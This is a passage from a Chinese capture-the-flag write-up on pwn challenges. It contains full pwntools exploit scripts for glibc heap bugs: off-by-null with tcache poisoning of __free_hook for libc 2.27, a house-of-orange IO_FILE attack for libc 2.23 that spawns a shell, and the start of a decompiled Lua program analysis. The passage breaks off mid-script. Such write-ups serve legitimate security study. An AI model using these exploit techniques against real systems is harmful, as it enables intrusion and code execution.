        sa('content:\n',content)
    def delete(idx):
        sl('4')
        sla('Index?\n',str(idx))
    enc = [0x4E, 0x79, 0x5F, 0x5F, 0x30, 0x5F, 0x74, 0x63, 0x5F, 0x31, 
      0x48, 0x74, 0x70, 0x6E, 0x65, 0x37]
    s = ''
    for i in range(4):
        for j in range(4):
            s += chr(enc[4*j+i])
            print s
    sla('请输入你的队伍名称:','SN-天虞')
    sla('请输入你的id或名字:','一梦不醒')
    sl('N0_py_1n_tHe_ct7')
    for i in range(8):
        add(i,0xf0)
    add(8,0x178)
    add(9,0x178)
    for i in range(7): # 1-7
        delete(i+1)
    edit(8,b'a'*0x170+p64(0x980)) #off by null
    edit(9,b'a'*0xf0+p64(0)+p64(0x81))
    delete(0) #unsigned bin
    delete(9) #chunk merge up to unsorted bin
    for i in range(7):
        add(i,0xf0)
    add(0,0xf0) 
    show(0)   # 0 1-8
    leak = l64()
    lg('leak')
    #dbg()
    libc_base = leak - 0x3b0230
    lg('libc_base')
    free_hook=libc_base+libc.sym['__free_hook']
    lg('free_hook')
    malloc_hook=libc_base+libc.sym['__malloc_hook']
    lg('malloc_hook')
    add(9,0xf0)
    delete(6) # 6==9
    #gdb.attach(p)
    edit(9,p64(free_hook-0x8))
    #dbg()
    add(6,0xf0) # 6
    add(9,0xf0) # 10
    #add1(0xf0)
    #gdb.attach(p)
    edit(9,"/bin/sh\x00"+p64(libc_base+libc.sym['system']))
    delete(9)
    irt()
exp3 libc-2.27:
    from pwn import *
    p=process('./noleak2')
    #p=remote('47.108.195.119',20182)
    context.terminal = ["/usr/bin/tmux","sp","-h"]
    context.log_level='debug'
    elf=ELF('./noleak2')
    libc=ELF('libc.so.6')
    #gdb.attach(p,'b *$rebase(0xfc9)')
    #p.sendline('n03tAck')
    #p.sendline('1u1u')
    p.sendlineafter('please input a str:','\x4e\x30\x5f\x70\x79\x5f\x31\x6e\x5f\x74\x48\x65\x5f\x63\x74\x37')
    def menu(id):
        p.sendlineafter('>',str(id))
    def add(id,size):
        menu(1)
        p.sendlineafter('Index?\n',str(id))
        p.sendlineafter('Size?\n',str(size))
    def show(id):
        menu(2)
        p.sendlineafter('Index?\n',str(id))
    def edit(id,content):
        menu(3)
        p.sendlineafter('Index?\n',str(id))
        p.sendlineafter('content:\n',str(content))
    def delete(id):
        menu(4)
        p.sendlineafter('Index?\n',str(id))
    add(0,0x450)
    add(1,0x18)
    add(2,0x4f0)
    add(3,0x18)
    delete(0)
    gdb.attach(p)
    edit(1,'a'*0x10+p64(0x480))
    delete(2)
    add(0,0x450)
    show(1)
    leak=u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
    malloc_hook=leak+0x7f3223b9bc30-0x7f3223b9bca0
    success('malloc_hook:'+hex(malloc_hook))
    libc_base=malloc_hook-libc.sym['__malloc_hook']
    success('libc_base:'+hex(libc_base))
    add(2,0x18)
    delete(2)
    edit(1,p64(libc_base+libc.sym['__free_hook']))
    add(4,0x10)
    add(5,0x10)
    edit(5,p64(libc_base+libc.sym['system']))
    add(6,0x30)
    edit(6,'/bin/sh\x00')
    delete(6)
    #gdb.attach(p)
    p.interactive()
###  总结
这个题目做之前看程序是2.23的，结果做完了发现libc是2.27的，直接崩溃，又换了2.27的利用方式，最后看官方wp直接申请大chunk直接泄露地址，比我的要简洁些，所以就有了这三个版本的exp，题目中规中矩，常规题目。此次第一次遇见远程环境要输入队名和用户名，拿到shell后获取的是sky_token,拿token去换flag，为了防止py也是想尽了办法呀，哈哈。
## PWN -> ezheap (heap overflow,no free,house of orange,IOfile)
###  题目分析
保护全开，环境libc-2.23，ida查看代码，
    unsigned __int64 chng_wpn()
    {
      int size; // [rsp+4h] [rbp-Ch] BYREF
      unsigned __int64 v2; // [rsp+8h] [rbp-8h]
      v2 = __readfsqword(0x28u);
      if ( !*((_QWORD *)&name + 1) )
      {
        puts("you have no weapon");
        exit(1);
      }
      puts("size of it");
      __isoc99_scanf(&unk_E94, &size);
      puts("name");
      read(0, *((void **)&name + 1), size);         // heap overflow
      putchar(10);
      return __readfsqword(0x28u) ^ v2;
    }
gift函数输出heap地址。  
分析程序功能：
  1. 输出heap地址
  2. add，申请空间，写入name，heap指针在bss段
  3. edit，堆溢出，只能编辑当前申请的chunk，不能编辑之前的
  4. show，输出当前chunk
###  利用
这种没有free函数的就用house of orange的思想，通过溢出将top chunk改小，申请比top chunk大的chunk的时候就会将top
chunk释放入相应的bin目录，系统再次为topchunk申请内存，达到free效果，可以接着house of
force申请大块内存到特定地址，从而申请到特定内存，去打freehook，malloc_hook;有时候申请大内存会报错，可以利用攻击IO_LIST_ALL制造fake
io_file_plus结构体，覆盖flag为binsh，io_overflow_t为system来劫持控制流。[iofile详细分析](https://blog.csdn.net/qq_39153421/article/details/115327308)
  1. Overwrite top chunk size through heap overflow
  2. free top chunk to unsortedbin to leak libc
  3. fake io _file_Plus structure attack IO_ list_all
  4. Call the add function to trigger iofile
###  exp
    # -*- coding: UTF-8 -*-    from pwn import *
    context.log_level = 'debug'
    context.terminal = ["/usr/bin/tmux","sp","-h"]
    #io = remote('47.108.195.119', 20182)
    # libc = ELF('./libc-2.31.so')
    io = process('./pwn')
    libc = ELF('/glibc/2.23/64/lib/libc.so.6')
    l64 = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
    l32 = lambda      :u32(io.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
    rl = lambda    a=False        : io.recvline(a)
    ru = lambda a,b=True    : io.recvuntil(a,b)
    rn = lambda x            : io.recvn(x)
    sn = lambda x            : io.send(x)
    sl = lambda x            : io.sendline(x)
    sa = lambda a,b            : io.sendafter(a,b)
    sla = lambda a,b        : io.sendlineafter(a,b)
    irt = lambda            : io.interactive()
    dbg = lambda text=None  : gdb.attach(io, text)
    lg = lambda s            : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
    uu32 = lambda data        : u32(data.ljust(4, '\x00'))
    uu64 = lambda data        : u64(data.ljust(8, '\x00'))
    ur64 = lambda data        : u64(data.rjust(8, '\x00'))
    def add(idx,size):
        sl('1')
        sla('Index?\n',str(idx))
        sla('Size?\n',str(size))
    def show(idx):
        sl('2')
        sla('Index?\n',str(idx))
    def edit(idx,content):
        sl('3')
        sla('Index?\n',str(idx))
        sa('content:\n',content)
    def delete(idx):
        sl('4')
        sla('Index?\n',str(idx))
    #sla('请输入你的队伍名称:','SN-天虞')
    #sla('请输入你的id或名字:','一梦不醒')
    def menu(index):
        sla("choice :",str(index))
    def create(size,content):
        menu(1)
        sla("of it\n",str(size))
        sa("ame?\n", content)
    def show():
        menu(3)
    def edit(size,content):
        menu(2)
        sla("of it\n",str(size))
        sa("ame\n", content)
    heap = int(rl(),16) - 0x10
    lg('heap') 
    create(0x20,"aaaaa\n")
    edit(0x30,b"a"*0x28+p64(0xfb1)) # house of orange
    create(0xff0,"bbbb\n")
    create(0x48,"\n")
    show()
    ru("is : ")
    info=uu64(rn(6))
    lg("info")
    libc_address= info - 0x3c410a
    lg('libc_address')
    malloc_hook = libc_address + libc.symbols['__malloc_hook']
    lg('malloc_hook')
    _IO_list_all_addr = libc_address + libc.sym['_IO_list_all']
    lg('_IO_list_all_addr')
    system_addr = libc_address + libc.sym['system']
    lg('system_addr')
    vtable_addr = heap + 0x178
    fake = "/bin/sh\x00"+p64(0x61)
    fake += p64(0xDEADBEEF)+p64(_IO_list_all_addr-0x10)
    fake +=p64(1)+p64(2) # fp->_IO_write_ptr > fp->_IO_write_base
    fake = fake.ljust(0xc0,"\x00")
    fake += p64(0)*3+p64(vtable_addr) # mode  pwnsky
###  题目分析
题目附件给了一个lua.bin、pwn和一些依赖库，看到这就知道这个是个lua、c互调的程序，增加直观上的题目难度，题目程序保护全开，没有找到程序的编译版本，但是可以看到libc版本为2.31。首先题目给出的是lua.bin文件，为lua的字节码，首先需要反编译lua.bin，得到lua源码。
###  反编译lua
开源工具有两个，一个是luadec（c写的），一个是unluac（java写的），两个都可以。不过unluac支持最新5.4.x的版本反编译。  
`java -jar unluac.jar lua.bin > lua.lua`反编译后：
    function Pwnsky(name)
      local self = {}
      local ServerInit = function()
        self.name = name
        self.account = 0
        self.password = 0
        self.is_login = 0
        self.init = init
        self.print_logo = print_logo
      end
      function self.info()
        print("Server Info:")
        local time = os.date("%c")
        print("Server name: " .. self.name)
        print("Date time: " .. time)
        if self.is_login == 0 then
          print("Account status: Not login")
        else
          print("Account status: Logined")
          print("Account : " .. self.account)
        end
      end
      function self.login()
        print("pwnsky cloud cache login")
        io.write("account:")
        self.account = io.read("*number")
        io.write("password:")
        self.password = io.read("*number")
        self.is_login = login(self.account, self.password)
        if self.is_login == 1 then
          print("login succeeded!")
        else